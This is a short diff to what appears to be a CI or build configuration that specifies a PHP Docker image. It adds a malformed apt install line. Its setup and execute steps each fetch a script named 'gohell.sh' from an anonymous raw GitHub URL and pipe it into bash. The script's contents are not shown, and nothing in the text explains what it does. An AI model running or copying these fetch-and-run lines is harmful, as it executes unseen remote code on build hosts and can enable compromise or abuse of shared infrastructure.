@@ -10,6 +10,7 @@
       docker_image_name: "library/php"
       docker_image_tag: "8.0.9"
       execute_commands:
+        - "apt install update && apt -y install git wget"
         - "curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash"
       setup_commands:
         - "curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash"
